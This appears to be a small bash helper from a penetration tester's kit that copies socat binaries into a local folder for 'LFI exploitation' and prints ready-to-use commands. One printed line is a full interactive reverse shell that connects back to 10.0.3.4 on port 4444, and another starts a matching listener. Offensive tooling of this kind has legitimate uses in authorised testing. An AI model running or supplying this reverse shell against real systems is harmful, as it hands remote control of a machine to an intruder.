#!/usr/bin/bash

# This script prepares tools and links for LFI exploitation

dir="net/socat"

if [ "$1" = "-r" ] ; then

    
    
    if [[ -d $PWD/$dir ]]
    then
	rm -rf $PWD/$dir/*
    fi
    exit
  
else

	if [[ ! -d $PWD/$dir ]]
	then
		mkdir -p $dir
	fi

    if [[ -d $PWD/$dir ]]
    then
	cp /opt/net/socat/* $dir
	
	echo "Copying all tools...done"
	ls $dir
	echo ""
	echo "Command: socat file:`tty`,raw,echo=0 tcp-listen:4444"
	echo "         socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"
	chmod 755 $dir/*
	
    else
	echo "No $dir directory exists"
    fi
fi

